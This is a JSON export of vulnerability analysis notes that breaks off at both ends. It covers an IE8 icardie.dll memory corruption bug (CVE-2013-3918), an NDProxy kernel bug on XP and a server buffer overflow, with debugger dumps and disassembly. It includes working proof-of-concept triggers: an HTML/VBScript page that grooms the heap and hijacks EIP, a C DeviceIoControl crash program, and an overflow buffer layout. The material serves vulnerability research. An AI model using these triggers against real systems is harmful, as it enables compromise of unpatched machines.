 44    if ( $file[ \"error\" ] 0 ) {\n    45     $Error = \"Error: \".$file[ \"error\" ];\n    46    } else {\n    47     $retFile = @copy( $file[ \"tmp_name\" ], $path.$file[ \"name\" ] );\n    48    }\n    49    // ===========================================================================\n    50   }\n```\n\nTo avoid the need of authentication, the exploit also takes advantage of another vulnerability\n(CVE-2015-8279) in the log exporting function to read an arbitrary file from the remote machine\nin order to obtain credentials that can be used for the attack.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "8c59ef48-e816-4137-a6f5-6dabf140a7ee",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "0e540893-4bad-42b2-9eee-658ade8002d8",
      "created": "2019-09-12T18:07:13.38942Z",
      "revisionDate": "2020-02-13T17:12:19.303095Z",
      "document": "--\n```\n\n\n## References\nhttp://www.php.net/ChangeLog-5.php#5.4.3\nFixed bug #61807 Buffer Overflow in apache_request_headers, CVE-2012-2329. => Bug private at the moment of writing\n\nhttp://www.securityfocus.com/bid/53455\n\nRedhat, include patches:\nhttps://bugzilla.redhat.com/show_bug.cgi?id=820000\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ec4642e3-ede8-41ca-a001-c1c54e13dec0",
      "editorId": "d88538cf-ab2c-464f-bb08-607db9cef99f",
      "topicId": "efa04c1f-0c48-4862-b1ce-56ea65b67c60",
      "created": "2019-09-12T18:07:14.342524Z",
      "revisionDate": "2020-06-10T21:36:55.404382Z",
      "document": "\n\nOriginally located at:\nhttp://pastebin.com/v3gGXtkf\n\nJSunpack:\n0fe86b1a6fc27dbd4134d96e68b9153682cc6831\n\n# References\n\n* http://blogs.technet.com/b/srd/archive/2013/11/12/technical-details-of-the-targeted-attack-using-cve-2013-3918.aspx\n* http://blogs.technet.com/b/msrc/archive/2013/11/11/activex-control-issue-being-addressed-in-update-tuesday.aspx\n* http://pastebin.com/v3gGXtkf\n* http://pastebin.com/a0ypqMJA\n* http://www.fireeye.com/blog/technical/2013/11/new-ie-zero-day-found-in-watering-hole-attack.html\n* http://technet.microsoft.com/en-us/security/bulletin/ms13-090\n\nword keys: icardie.dll\n\n\n# Crash\n\n:)\n\n```\n(f00.eb0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0290f1bc ebx=00000000 ecx=03cc0210 edx=020bf5fc esi=00000002 edi=03f8150c\neip=cccccccc esp=020bf5cc ebp=020bf5d8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\ncccccccc ??              ???\n\n0:008> kb\nChildEBP RetAddr  Args to Child\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n020bf5c8 63663c41 03d6ea80 020bf60c 020bf630 0xcccccccc\n020bf5d8 63663d7d 03cc0210 038c31d0 03cc0210 mshtml!PlainTrackerAddRef+0x20\n020bf630 03f9226c 03cc0210 03f814fc 020bf694 mshtml!PlainTrackerQueryInterface+0x82\n020bf698 03f921f4 03cc0210 020bf6a8 03bc4728 vbscript!VAR::ObjGetDefault+0x67\n020bf6ac 03f83a13 00000000 038f2110 00008000 vbscript!VAR::PvarGetVarVal+0x20\n020bf6bc 03f841c3 038f2110 020bf7ac 020bf824 vbscript!VAR::PvarGetArithVal+0xc\n020bf6d4 03f8f730 038f2100 038f20f0 020bf934 vbscript!VbsVarRel+0x24\n020bf7cc 03f863ee 020bf934 e17be18b 00000000 vbscript!CScriptRuntime::RunNoEH+0x1641\n020bf814 03f86373 020bf934 038c2958 038c31d0 vbscript!CScriptRuntime::Run+0x62\n020bf90c 03f86ba5 020bf934 00000000 00000000 vbscript!CScriptEntryPoint::Call+0x51\n020bf968 03f86d9d 038c2958 020bfb30 00000000 vbscript!CSession::Execute+0xc8\n020bf9b8 03fa052c 020bfb30 020bfb40 00000008 vbscript!COleScript::ExecutePendingScripts+0x144\n020bfa1c 03f8a2ec 028eab74 02877e04 00000000 vbscript!COleScript::ParseScriptTextCore+0x243\n020bfa48 635bf025 038c25ac 028eab74 02877e04 vbscript!COleScript::ParseScriptText+0x2b\n020bfaa0 635be7ca 0022c750 02d60700 0023d490 mshtml!CScriptCollection::ParseScriptText+0x219\n020bfb64 635be5ab 00000000 00000000 00000000 mshtml!CScriptElement::CommitCode+0x3a9\n020bfb98 635ac020 7c80932e 001e8688 001e8688 mshtml!CScriptElement::Execute+0xc4\n020bfbec 635a74f0 0282c460 7c80932e 001e8688 mshtml!CHtmParse::Execute+0x4a\n020bfc04 635a7266 635a6a75 000c79e5 001e8688 mshtml!CHtmPost::Broadcast+0xf\n020bfcc4 635ae7ae 000c79e5 00000000 001e8688 mshtml!CHtmPost::Exec+0x5f6\n020bfcdc 635ac21b 000c79e5 0021a090 00000180 mshtml!CHtmPost::Run+0x178\n020bfcfc 635cece9 0021a090 000c79e5 001e8688 mshtml!PostManExecute+0x1fd\n020bfd24 6364de62 63ab0d18 0021a090 0021a090 mshtml!CPostManager::PostManOnTimer+0x134\n020bfd58 6363c3c5 020bfde0 6363c317 00000000 mshtml!GlobalWndOnMethodCall+0xfb\n020bfd78 7e418734 0003049e 00000008 00000000 mshtml!GlobalWndProc+0x183\n020bfda4 7e418816 6363c317 0003049e 00008002 USER32!InternalCallWinProc+0x28\n020bfe0c 7e4189cd 00000000 6363c317 0003049e USER32!UserCallWinProcCheckWow+0x150\n020bfe6c 7e418a10 020bfe94 00000000 020bfeec USER32!DispatchMessageWorker+0x306\n020bfe7c 01252ec9 020bfe94 00000000 008d5db8 USER32!DispatchMessageW+0xf\n020bfeec 011f48bf 00171d80 00000001 0014f860 IEFRAME!CTabWindow::_TabWindowThreadProc+0x461\n020bffa4 5de05a60 008d5db8 0c20002f 020bffec IEFRAME!LCIETab_ThreadProc+0x2c1\n020bffb4 7c80b713 0014f860 00000001 0c20002f iertutil!CIsoScope::RegisterThread+0xab\n020bffec 00000000 5de05a52 0014f860 00000000 kernel32!BaseThreadStart+0x37\n\n\n0:008> dd eax\n0290f1bc  cccccccc cccccccc cccccccc cccccccc\n0290f1cc  cccccccc cccccccc cccccccc cccccccc\n0290f1dc  cccccccc cccccccc 00000000 e8660255\n0290f1ec  ff080000 000000aa 00000000 00000000\n0290f1fc  00000000 00000000 00000000 00000000\n0290f20c  00000000 00000000 00000000 00000000\n0290f21c  00000000 e866022c ff080000 000000b1\n0290f22c  00000000 00000000 00000000 00000000\n```\n\n\nCrash without controllling EIP, but interesting to go into the thing:\n\n```\n(ea8.d98): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=0018fec4 ecx=038e1b80 edx=038e1b80 esi=008dfff0 edi=fffffffb\neip=036a9d1a esp=020bf3e4 ebp=020bf3f8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nicardie!CCardSpaceClaimCollection::remove+0x74:\n036a9d1a ff34b8          push    dword ptr [eax+edi*4] ds:0023:ffffffec=????????\n0:008> .symfix\n0:008> .reload\nReloading current modules\n................................................................\n........\n0:008> kb\nChildEBP RetAddr  Args to Child\n020bf3f8 77135cd9 008dfff0 038e1b80 020bf448 icardie!CCardSpaceClaimCollection::remove+0x74\n020bf414 771362e8 008dfff0 0000002c 00000004 OLEAUT32!DispCallFunc+0x16a\n020bf4a4 036a49e2 0289b8a4 008dfff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x234\n020bf4d0 036aa200 008dfff0 00000018 00000409 icardie!ATL::CComTypeInfoHolder::Invoke+0x42\n020bf4f8 036d3eb7 008dfff0 00000018 036d1a2c icardie!ATL::IDispatchImpl<ICardSpaceClaimCollection,&IID_ICardSpaceClaimCollection,&LIBID_icardie,1,0,ATL::CComTypeInfoHolder>::Invoke+0x27\n020bf534 036d3e27 008dcef0 008dfff0 00000018 vbscript!IDispatchInvoke2+0xb2\n020bf570 036d3397 008dcef0 008dfff0 00000018 vbscript!IDispatchInvoke+0x59\n020bf684 036d3d88 008dcef0 008dfff0 00000018 vbscript!InvokeDispatch+0x13a\n020bf6a8 036d409f 008dcef0 008dfff0 00000018 vbscript!InvokeByName+0x42\n020bf7b4 036d63ee 020bf91c dd7edec9 00000000 vbscript!CScriptRuntime::RunNoEH+0x234c\n020bf7fc 036d6373 020bf91c 008dd7d8 008dcef0 vbscript!CScriptRuntime::Run+0x62\n020bf8f4 036d6ba5 020bf91c 00000000 00000000 vbscript!CScriptEntryPoint::Call+0x51\n020bf950 036d6d9d 008dd7d8 020bfb18 00000000 vbscript!CSession::Execute+0xc8\n020bf9a0 036f052c 020bfb18 020bfb28 00000008 vbscript!COleScript::ExecutePendingScripts+0x144\n020bfa04 036da2ec 02dc958c 02877de4 00000000 vbscript!COleScript::ParseScriptTextCore+0x243\n020bfa30 635bf025 008dd44c 02dc958c 02877de4 vbscript!COleScript::ParseScriptText+0x2b\n020bfa88 635be7ca 0022cb88 028fd828 0023d9e8 mshtml!CScriptCollection::ParseScriptText+0x219\n020bfb4c 635be5ab 00000000 00000000 00000000 mshtml!CScriptElement::CommitCode+0x3a9\n020bfb80 635ac020 7c80932e 001e9350 001e9350 mshtml!CScriptElement::Execute+0xc4\n020bfbd4 635a74f0 028b9060 7c80932e 001e9350 mshtml!CHtmParse::Execute+0x4a\n020bfbec 635a7266 635a6a75 003c3522 001e9350 mshtml!CHtmPost::Broadcast+0xf\n020bfcac 635ae7ae 003c3522 00000000 001e9350 mshtml!CHtmPost::Exec+0x5f6\n020bfcc4 635ac21b 003c3522 00000000 001e9350 mshtml!CHtmPost::Run+0x178\n020bfce4 635ac17e 0021a5e8 003c3522 001e9350 mshtml!PostManExecute+0x1fd\n020bfd04 635ac0e2 00000001 00000018 020bfd24 mshtml!PostManResume+0xf8\n020bfd14 63655d60 0023ad68 001e9350 020bfd58 mshtml!CHtmPost::OnDwnChanCallback+0x10\n020bfd24 6364de62 0023ad68 00000000 0021a5e8 mshtml!CDwnChan::OnMethodCall+0x19\n020bfd58 6363c3c5 020bfde0 6363c317 00000000 mshtml!GlobalWndOnMethodCall+0xfb\n020bfd78 7e418734 0021046e 0000000e 00000000 mshtml!GlobalWndProc+0x183\n020bfda4 7e418816 6363c317 0021046e 00008002 USER32!InternalCallWinProc+0x28\n020bfe0c 7e4189cd 00000000 6363c317 0021046e USER32!UserCallWinProcCheckWow+0x150\n020bfe6c 7e418a10 020bfe94 00000000 020bfeec USER32!DispatchMessageWorker+0x306\n020bfe7c 01252ec9 020bfe94 00000000 008d5d28 USER32!DispatchMessageW+0xf\n020bfeec 011f48bf 00170fc0 00000001 0014f860 IEFRAME!CTabWindow::_TabWindowThreadProc+0x461\n020bffa4 5de05a60 008d5d28 00bc002f 020bffec IEFRAME!LCIETab_ThreadProc+0x2c1\n020bffb4 7c80b713 0014f860 00000001 00bc002f iertutil!CIsoScope::RegisterThread+0xab\n020bffec 00000000 5de05a52 0014f860 00000000 kernel32!BaseThreadStart+0x37\n```\n\n# PoC cleanup:\n\n```\n<html><body>\n<object classid='clsid:19916E01-B44E-4E31-94A4-4696DF46157B' id='CardSpaceSigninHelper'></object>\n<script language='JavaScript'>\n\nfunction get_code(){\n\tvar code = \"\\ubbbb\\ubbbb\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\\ucccc\";\n\treturn code;\n}\n</script>\n<script language='vbscript'>\nOn Error Resume Next\nDim jjvmscqvm,eoyehpnucwq,hcanmotm\neoyehpnucwq = -7\nhcanmotm = 0\njjvmscqvm = 5493\nDim massage_array(5493)\n\nSet required_claims = CardSpaceSigninHelper.requiredClaims\n\nFor i = 0 to 5493\n\tSet massage_array(i) = document.createElement(\"object\")\nNext\n\nFor i = 4093 to 5493 Step 2\n\tmassage_array(i) = Null\nNext\n\nFor i = 0 to -7 Step -1\n\trequired_claims.remove(CLng(i))\nNext\n\nDim my_code\nmy_code = get_code()\nrequired_claims.add(my_code)\n\nFor i = 0 to 5493\n\tif massage_array(i) <> Null Then\n\t\tmassage_array(i).focus\n\tEnd If\nNext\n\n'For i = 0 to 5493\n'\tmassage_array(i) = Null\n'Next\n\n</script></body></html>\n```\n\n\nExploit module targeting xp sp3 IE8 on sploits, no spray needed :)\n\n\nTime to dig more into the vulnerability....\n\n\nFirst of all reviewing the CCardSpaceClaimCollection which is abused. It is a 0x10 size object:\n\n```\n.text:0040A6E8                 and     dword ptr [edi], 0\n.text:0040A6EB                 push    ebx\n.text:0040A6EC                 push    esi\n.text:0040A6ED                 push    10h             ; unsigned int\n.text:0040A6EF                 mov     ebx, 8007000Eh\n.text:0040A6F4                 call    ??2@YAPAXI@Z    ; operator new(uint)\n```\n\nWhere\n\n0x0 ==> vftable\n0x4 ==> unknown\n0x8 ==> number of elements\n0xc ==> pointer to the CCardSpaceClaimCollection elements (It's a SafeArray storage: http://msdn.microsoft.com/en-us/library/windows/desktop/ms221482(v=vs.85).aspx)\n\nBoth three fields are initialized to 0 / NULL when creating an instance:\n\n```\n.text:00409980 ; public: __thiscall CCardSpaceClaimCollection::CCardSpaceClaimCollection(void)\n.text:00409980                 xor     ecx, ecx\n.text:00409982                 mov     [eax+4], ecx\n.text:00409985                 mov     [eax+8], ecx\n.text:00409988                 mov     [eax+0Ch], ecx\n.text:0040998B                 retn\n```\n\nThe first problem start on CCardSpaceClaimCollection::remove, if you try to remove an element from a 0 length collection, the length field is underflowed:\n\n```\n.text:00409D46 loc_409D46:                             ; CODE XREF: CCardSpaceClaimCollection::remove(tagVARIANT *)+85\u0018j\n.text:00409D46                 dec     dword ptr [esi+8] ;  esi pointing to the CCardSpaceClaimCollection\n```\n\nDebugging the underflow (rembember little endian):\n\n```\n0:017> bu icardie!CCardSpaceClaimCollection::remove+0xa0\n0:017> g\nModLoad: 033b0000 033c2000   C:\\WINDOWS\\system32\\icardie.dll\nModLoad: 63380000 63434000   C:\\WINDOWS\\system32\\jscript.dll\nModLoad: 034e0000 0354a000   C:\\WINDOWS\\system32\\vbscript.dll\nBreakpoint 0 hit\neax=03672280 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=00000000\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=00000000\n0:008> g\nBreakpoint 0 hit\neax=0367227c ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=ffffffff\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=ffffffff\n0:008> g\nBreakpoint 0 hit\neax=03672278 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffe\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=feffffff\n0:008> g\nBreakpoint 0 hit\neax=03672274 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffd\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fdffffff\n0:008> g\nBreakpoint 0 hit\neax=03672270 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffc\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fcffffff\n0:008> g\nBreakpoint 0 hit\neax=0367226c ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffb\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fbffffff\n0:008> g\nBreakpoint 0 hit\neax=03672268 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffa\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=faffffff\n0:008> g\nBreakpoint 0 hit\neax=03672264 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffff9\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=f9ffffff\n0:008> g\n```\n\nThe second problem happens on CCardSpaceClaimCollection::add\n\nFirst of all the SafeArray Container is get:\n\n```\n.text:00409C0A                 mov     esi, [ebp+arg_0]\n.text:00409C0D                 call    ?GetInnerArray@CCardSpaceClaimCollection@@AAEPAUtagSAFEARRAY@@XZ ; C\n```\n\n and its capacity checked, so if needed it's going to be resized\n\n```\n.text:00409C20 loc_409C20:                             ; CODE XREF: CCardSpaceClaimCollection::add(tagVARIANT *)+48\u0018j\n.text:00409C20                 mov     ebx, [esi+8]    ; The number of elements\n.text:00409C23                 inc     ebx             ; The number of elements incremented\n.text:00409C24                 call    ?GrowInnerArrayIfRequired@CCardSpaceClaimCollection@@AAEJJ@Z ;\n```\n\nSIn order to check if the collections needs to be resized GrowInnerArrayIfRequired checks the elements container after increment, with\nthe capacity of the SafeArray, sinze the comparision is signed, nothing is resized:\n\n```\n0:008> g\nBreakpoint 4 hit\neax=00000000 ebx=fffffff9 ecx=00000009 edx=0000000a esi=0035e6b8 edi=00242b44\neip=036a9e41 esp=0201f3d0 ebp=0201f3dc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nicardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x2e:\n036a9e41 3bda            cmp     ebx,edx\n0:008> r ebx, edx\nebx=fffffff9 edx=0000000a\n```\n\nBecause of the signed comparision, nothing is resized:\n\n```\n0:008> t\neax=00000000 ebx=fffffff9 ecx=00000009 edx=0000000a esi=0035e6b8 edi=00242b44\neip=036a9e43 esp=0201f3d0 ebp=0201f3dc iopl=0         nv up ei ng nz ac po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292\nicardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x30:\n036a9e43 7e1f            jle     icardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x51 (036a9e64) [br=1]\n```\n\nA pointer to the data of the SafeArray is stored into a local variable:\n\n```\n.text:00409C2F                 lea     eax, [ebp+ppvData]\n.text:00409C32                 push    eax             ; ppvData\n.text:00409C33                 push    [ebp+psa]       ; psa\n.text:00409C36                 call    ds:__imp__SafeArrayAccessData@8 ; SafeArrayAccessData(x,x)\n```\n\nAn string with the contents is created, and the contents are stored into the ppvData, unfortunately.... here the underflowed counter is used:\n\n```\n.text:00409C51                 push    dword ptr [edi+8] ; psz\n.text:00409C54                 call    ds:__imp__SysAllocString@4 ; SysAllocString(x)\n.text:00409C5A                 mov     ecx, [esi+8]\n.text:00409C5D                 mov     edx, [ebp+ppvData]\n.text:00409C60                 mov     [edx+ecx*4], eax ; edx pointer to ppvdata, ecx is the corrupted CCardSpaceClaimCollection length\n```\n\nFinally the CCardSpaceClaimCollection size is incremented:\n\n```\n.text:00409C63                 inc     dword ptr [esi+8]\n```\n\nWhen debugging :\n\n```\n0:008> t\neax=001f5884 ebx=00000000 ecx=fffffff8 edx=00000028 esi=0035e6b8 edi=00242b44\neip=036a9c5d esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nicardie!CCardSpaceClaimCollection::add+0x8e:\n036a9c5d 8b55f8          mov     edx,dword ptr [ebp-8] ss:0023:0201f3f0=10798a03\n0:008> t\n```\n\nHere the underflow happens edx+ecx*4 points to 038a78f0, which is under 038a7910, where ppvData lives:\n\n```\neax=001f5884 ebx=00000000 ecx=fffffff8 edx=038a7910 esi=0035e6b8 edi=00242b44\neip=036a9c60 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nicardie!CCardSpaceClaimCollection::add+0x91:\n036a9c60 89048a          mov     dword ptr [edx+ecx*4],eax ds:0023:038a78f0=00000000\n0:008> t\neax=001f5884 ebx=00000000 ecx=fffffff8 edx=038a7910 esi=0035e6b8 edi=00242b44\neip=036a9c63 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nicardie!CCardSpaceClaimCollection::add+0x94:\n036a9c63 ff4608          inc     dword ptr [esi+8]    ds:0023:0035e6c0=f8ffffff\n```\n\nLater a fake object is used:\n\n```\n0:008> g\n(b4c.b70): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=001f5884 ebx=00000000 ecx=038a78e0 edx=0201f5e4 esi=00000002 edi=036d150c\neip=cccccccc esp=0201f5b4 ebp=0201f5c0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\ncccccccc ??              ???\n0:008> dd ecx\n038a78e0  63ab1b18 00000002 6363fbe4 03894d38\n038a78f0  001f5884 00000000 00000000 00000000\n038a7900  00000000 00000000 00000000 00000000\n038a7910  00000000 00000000 00000000 00000000\n038a7920  00000000 00000000 00000000 00000000\n038a7930  00000000 00000000 e8319dff ff080100\n038a7940  63ab1b18 00000001 6363fbe4 03894f08\n038a7950  63767260 00000000 00000000 00020000\n0:008> db 001f5884\n001f5884  bb bb bb bb cc cc cc cc-cc cc cc cc cc cc cc cc  ................\n001f5894  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................\n001f58a4  cc cc cc cc cc cc cc cc-00 00 00 00 e6 7e a1 ea  .............~..\n001f58b4  00 01 08 ff 70 18 5c 75-2c 18 5c 75 02 00 00 00  ....p.\\u,.\\u....\n001f58c4  e8 ac 9c 02 00 00 00 80-f3 1b 5d 75 b8 58 1f 00  ..........]u.X..\n001f58d4  48 00 9c 02 84 14 5c 75-e8 ac 9c 02 1b 00 00 00  H.....\\u........\n001f58e4  e8 52 19 00 ed 7e a1 ea-00 01 08 ff 08 00 00 00  .R...~..........\n001f58f4  90 01 00 00 f0 00 00 00-00 00 00 00 01 00 00 00  ................\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "c50c5aa2-b9c5-473a-95ae-87ced107cf61",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "d83c6dff-70df-421b-beba-cdd1d7776aff",
      "created": "2019-09-12T18:07:15.072965Z",
      "revisionDate": "2020-02-13T17:12:18.705594Z",
      "document": "-\n```\n\nIn addition, ```var_DE64``` is used to store the ```UserID``` information by a simple memcpy routine:\n\n```\n.text:0040F2D7 mov     eax, ecx\n.text:0040F2D9 mov     esi, edi\n.text:0040F2DB mov     edi, edx\n.text:0040F2DD push    ebx\n.text:0040F2DE shr     ecx, 2\n.text:0040F2E1 rep movsd\n```\n\nIf ```UserID``` has a value of \"AAAA\", in a debugger the buffers would look like this:\n\n```\n01EEB494   41414141  AAAA\n01EEB498   00000000  ....\n01EEB49C   00000000  ....\n01EEB4A0   00000000  ....\n01EEB4A4   00000000  ....\n01EEB4A8   00000000  ....\n01EEB4AC   00000000  ....\n01EEB4B0   00000000  ....\n01EEB4B4   00000000  ....\n01EEB4B8   00000000  ....\n01EEB4BC   00000000  ....\n01EEB4C0   00000000  ....\n01EEB4C4   00000000  ....\n01EEB4C8   00000000  ....\n01EEB4CC   00000000  ....\n01EEB4D0   00000000  ....\n01EEB4D4   01000101  \u0001\u0001.\u0001\n01EEB4D8   016EE168  h\u00e1n\u0001  ASCII \"2.60 ,MyDB Engine,Copyright_2002 MGH Software Inc.\"\n01EEB4DC   00518470  p\u201eQ.  abws.00518470\n01EEB4E0   00518470  p\u201eQ.  abws.00518470\n01EEB4E4   004F2F7C  |/O.  abws.004F2F7C\n01EEB4E8   00000250  P\u0002..\n```\n\nIn the above example, the range from 01EEB494 to 01EEB4D0 is exactly 64 bytes, this is our\n```var_DE64``` buffer. Right below that is our ```var_DE24```, which is what ESI points to\nat the time of the crash. At the 0x10th byte of ESI is where EDX is, which is used by the\n```CALL DWORD [edx+28h]``` instruction. The following code represents this:\n\n```ruby\nbuf = \"A\" * 64         # 64 bytes for var_DE64\nbuf << \"BBBB\"          # We start overwriting var_DE24 buffer here\nbuf << \"C\" * (16-4)    # Padding for [ESI+10h] so the 16th DWORD is our DDDD\nbuf << \"DDDD\"          # EDX (which will be used by the CALL DWORD [edx+28h] instruction)\nbuf << \"E\" * (4 * 100) # Extra padding so we can see the overflow better\n```\n\nSince the overflow ends up writing an object in ```var_DE24``` and gets used by the function,\nthis results a type confusion (a string being treated as an object).\n\n# Breakpoints\n\n* The first breakpoint is the alloca_probe call\n* The second breakpoint is the destination buffer for the mempcy that copies the UserID value to ```var_DE64```\n* The third is the beginning of the vulnerable function\n\n```\n0:006> bl\n 0 e 0040f10a     0001 (0001)  0:**** abws+0xf10a\n 1 e 0040f2db     0001 (0001)  0:**** abws+0xf2db\n 2 e 0040f0f0     0001 (0001)  0:**** abws+0xf0f0\n ```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "9c902135-ee6e-430f-883a-fd3c439d7a81",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "4ae7f20a-0e5d-4d84-a65a-23b30c17644b",
      "created": "2019-09-12T18:07:15.82467Z",
      "revisionDate": "2020-02-13T17:12:18.501898Z",
      "document": "\n\nXp recently broke a local kernel vulnerability extract is said to\ncapture the eyes of fire in Adobe 0day attack another 0day.\n\n# PoC\n\n```c\n# Include \" windows.h \"\n# include \" stdio.h \"\nvoid main ()\n{\n    HANDLE hDev = CreateFile ( \" . \\ \\ \\ \\ \\ \\ NDProxy \" , GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0 , NULL);\n     if (hDev == INVALID_HANDLE_VALUE)\n    {\n        printf ( \" CreateFile Error:% d \\ N \" , GetLastError ());\n    }\n    DWORD inbuf [ 0x15 ] = { 0 };\n    DWORD dwRetBytes  = 0 ;\n    * (inbuf + 5 ) = 0x7030125 ;\n    * (inbuf + 7 ) = 0x34 ;\n\n    DeviceIoControl (hDev, 0x8fff23cc , inbuf, 0x54 , inbuf, 0x24 , & dwRetBytes, 0 );\n    CloseHandle (hDev);\n}\n```\n\n# Details\n\nDirectly compiled to run on xp sp3 will cause a blue screen, attach the debugger, see the following\nexceptions:\n\n```\nAccess violation - code c0000005 (second chance!!!!!!)\n 00000038 ?????\n  kd> r\n  eax = 000001B0 ecx = 00000000 ebx = 81e16d80 edx = 00000000 ESI = 81f31a30 edi = f88f273c\n  eip = 00000038 esp = b203ec18 ebp = b203ec34 iopl up EI pl = 0 NV NZ Na PO NC\n  cs = 0008 SS = 0010 DS = 0023 es = 0023 fs = 0030 GS = 0000 efl = 00010202\n  00000038??\nkd> kb\nChildEBP RetAddr Args to Child\nWARNING: Frame IP Not in . any known Module Following frames May be wrong.\nb203ec14 f88ed145 81f31a30 81a76c10 81f2b2c0 0x38\nb203ec34 8 04ef129 81f46ed8 000001B0 8 06d32d0 NDProxy! PxIODispatch +0 x2b3\nb203ec44 8 0575dde 81e16df0 81a76c10 81e16d80 nt! IopfCallDriver +0 X31\nb203ec58 8 0576c7f 81f46ed8 81e16d80 81a76c10 nt! IopSynchronousServiceTail +0 X70\nb203ed00 8 056f4ec 000007e8 00000000 00000000 nt! IopXxxControlFile +0 x5e7\nb203ed34 8 053e648 000007e8 00000000 00000000 nt! NtDeviceIoControlFile +0 x2a\nb203ed34 7c92e4f4 000007e8 00000000 00000000 nt! KiFastCallEntry +0 xf8\n 0012fe4c 7c92d26c 7c801675 000007e8 00000000 ntdll! KiFastSystemCallRet\n 0012fe50 7c801675 000007e8 00000000 00000000 ntdll! ZwDeviceIoControlFile +0 XC\n 0012feb0 004010c2 000007e8 